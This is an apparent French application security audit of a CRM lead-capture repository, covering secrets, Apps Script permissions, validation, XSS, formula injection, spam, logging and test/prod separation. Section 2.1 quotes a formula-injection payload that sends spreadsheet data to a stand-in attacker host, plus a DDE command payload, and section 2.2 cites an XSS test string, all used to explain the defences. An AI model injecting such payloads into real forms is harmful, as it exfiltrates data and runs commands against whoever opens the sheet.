# AUDIT DE SÉCURITÉ APPLICATIVE, CRM & PROTECTION DES DONNÉES — MISSION AGIA-009

**Référence :** SYNTESIA-SEC-AUDIT-009  
**Date :** 21 novembre 2026  
**Périmètre audité :** Dépôt `naitconv-web/agia-infrastructure` (`sites/`, `automations/`, `scripts/`, `docs/`)  
**Règle de confidentialité :** Aucun secret, jeton ou donnée personnelle réelle n'est affiché ou copié dans ce rapport.

---

## 1. SYNTHÈSE DES 8 DOMAINES DE CONTRÔLE SÉCURITÉ

| Domaine audité | Statut initial (`26ac619`) | Statut final après durcissement (`AGIA-009`) | Niveau de maîtrise |
| :--- | :---: | :---: | :--- |
| **1. Exposition des URL et secrets dans le dépôt GitHub** | Conforme | **`VÉRIFIÉ — ZÉRO SECRET EXPOSÉ`** | Aucun fichier `.env`, aucune clé API privée, aucun jeton OAuth dans l'arbre Git (`WEBHOOK_URL = ""`). |
| **2. Permissions & Surface d'exposition Google Apps Script** | Conforme | **`VÉRIFIÉ — LECTURE PUBLIQUE IMPOSSIBLE`** | Le script `google_apps_script_crm_sync.js` n'expose **aucune fonction `doGet(e)`** : un attaquant qui connaîtrait l'URL future du Web App ne peut jamais lire le contenu du tableur CRM. |
| **3. Validation côté serveur (`doPost` & Python)** | Partiel | **`DURCI & VÉRIFIÉ (`GAS-05`, `GAS-07`)`** | Plafond strict `rawData.length <= 15 000` octets (anti-DoS), validation serveur regex e-mail et téléphone E.164 (`8` à `15` chiffres, `/^[+\d\s().\-/]{8,25}$/`), troncature par champ. |
| **4. Injections HTML/JS (XSS) & Formules Tableur (`CWE-1236`)** | XSS protégé / **`CWE-1236` vulnérable (`ANOM-009-01`)** | **`CORRIGÉ & VÉRIFIÉ (`TC-09`, `GAS-04`, `CRM-LIVE-01`)`** | Double barrière : `escapeHtml()` intégral sur le rendu DOM (`&`, `<`, `>`, `"`, `'`) + `sanitizeSheetField()` neutralisant tout préfixe `=`, `+`, `-`, `@`, `\|`, `%` par une apostrophe `'`. |
| **5. Spam, robots et abus de formulaires** | Honeypot actif / **Doublons non bloqués (`ANOM-009-03`)** | **`CORRIGÉ & VÉRIFIÉ (`TC-05`, `TC-08`, `GAS-03`, `GAS-06`, `GAS-08`)`** | 4 Honeypots distincts filtrés client + serveur, verrou `isSubmitting` + bouton désactivé, anti-doublon client `120 s`, dédoublonnage serveur sur les 25 dernières lignes, verrou `LockService` 10 s. |
| **6. Politique de collecte & Zéro fuite d'IP vers des tiers** | Conforme | **`VÉRIFIÉ — ZÉRO REQUÊTE TIERCE`** | Suppression totale des appels CDN (`cdn.tailwindcss.com`, `fonts.googleapis.com`) : aucune adresse IP visiteur n'est transmise à un serveur externe à l'ouverture des pages. |
| **7. Absence de données personnelles (PII) dans les journaux** | **Perfectible (`ANOM-009-05`)** | **`CORRIGÉ & VÉRIFIÉ`** | Purge de toute PII (nom, e-mail, téléphone, raison sociale) dans `stdout`, `Logger.log` et dans le corps de l'e-mail d'alerte non chiffré (qui ne contient plus que l'`ID_Lead`, le score et le lien vers le CRM sécurisé). |
| **8. Sécurité du dépôt GitHub et séparation `TEST` / `PROD`** | Conforme | **`VÉRIFIÉ`** | Dépôt privé, colonne O (`Environnement = TEST \| PROD`) garantissant qu'aucune donnée de recette ne pollue les KPIs commerciaux ni ne déclenche d'alerte e-mail de production. |

---

## 2. ANALYSE DÉTAILLÉE DES MÉCANISMES DE PROTECTION

### 2.1. Protection contre l'injection de formules Google Sheets (`CWE-1236` — Correction P0 `ANOM-009-01`)
- **Risque identifié :** Lorsqu'un formulaire web alimente un tableur (Google Sheets ou Excel/CSV), un attaquant peut saisir dans le champ *Nom*, *Entreprise* ou *Description* une charge utile telle que `=IMPORTXML("https://attaquant.tld/exfil?d="&CONCATENATE(A2:O2), "//a")` ou `+CMD|'/C calc'!A0`. Sans neutralisation, Google Sheets exécute la formule à l'ouverture de la feuille.
- **Mesure appliquée en défense en profondeur (3 couches) :**
  1. **Couche 1 — Client (`sites/shared/syntesia-forms.js`) :** `sanitizeSheetField(str, maxLen)` nettoie les caractères de contrôle ASCII (`\x00-\x1F`) et préfixe d'une apostrophe `'` toute chaîne commençant par `=`, `+`, `-`, `@`, `|` ou `%`.
  2. **Couche 2 — Webhook Serveur (`automations/google_apps_script_crm_sync.js`) :** Même si un attaquant contourne le navigateur et envoie une requête `curl -X POST` directe vers l'URL Apps Script, `doPost(e)` applique `sanitizeSheetField()` côté serveur sur chacun des champs avant `leadsSheet.appendRow(...)`.
  3. **Couche 3 — Orchestrateur Python (`scripts/orchestrate_crm.py`) :** `sanitize_sheet_field()` applique la même neutralisation avant tout appel à `gsheets mutate append`.
- **Preuve de vérification en conditions réelles :**
  - Ligne `LEAD-TEST-20261121-183904-4493` insérée dans `01_PROSPECTS_LEADS` : la charge `=TEST_FORMULE_NEUTRALISEE_AGIA_009` est stockée sous la forme littérale inoffensive `'=TEST_FORMULE_NEUTRALISEE_AGIA_009`.

### 2.2. Protection contre les injections XSS (Cross-Site Scripting)
- **Sur le front-end (`syntesia-forms.js`) :** L'affichage du message de confirmation utilise systématiquement `escapeHtml()` qui convertit `&`, `<`, `>`, `"` et `'` en entités HTML inertes. Le test Chromium CDP `TC-09` (`<img src=x onerror=alert(1)>`) a confirmé l'absence totale d'exécution de script et l'absence de nœud `<img>` injecté dans le DOM.
- **Sur le champ Téléphone (`ANOM-009-04`) :** L'expression régulière `/^[+\d\s().\-/]{8,25}$/` combinée au comptage de 8 à 15 chiffres interdit formellement la présence de toute lettre ou chevron dans un numéro de téléphone (`TC-03b` et `GAS-05`).

### 2.3. Modèle de permissions Google Apps Script & Cloisonnement du CRM
- Lorsque le fondateur déploiera `automations/google_apps_script_crm_sync.js` en *Application Web* (*Exécuter en tant que : Moi*, *Accès : Tout le monde*), l'URL générée n'exposera **que le point d'entrée `doPost(e)`**.
- **Aucune fonction `doGet(e)` n'existe dans le script** : le tableur Google Sheets `1EmC6f4ljLU2GZmD9HEBt50WdTlVXoQtPQ64vFQL1I_0` reste **100 % privé** sur le Google Drive du fondateur, et seule l'opération atomique d'ajout d'une ligne (`appendRow`) après validation est possible via le webhook.

### 2.4. Hygiène des journaux et notifications (`Zéro PII dans les logs`)
- Conformément au principe de minimisation RGPD (Art. 5.1.c & Art. 32), un journal technique ou un e-mail transitant en clair sur SMTP ne doit pas contenir la fiche nominative complète d'un prospect :
  - `scripts/orchestrate_crm.py` journalise uniquement : `[CRM INGESTION] Lead inséré avec succès : LEAD-... | Marché: ... | Env: ... | Score: .../10 | Statut: ...`.
  - `automations/google_apps_script_crm_sync.js` journalise en cas d'exception uniquement `error.name` (sans dump de `e.postData.contents`), et l'e-mail d'alerte interne notifie uniquement l'`ID_Lead`, le marché, la verticale, le score et le lien HTTPS vers le tableur CRM authentifié.
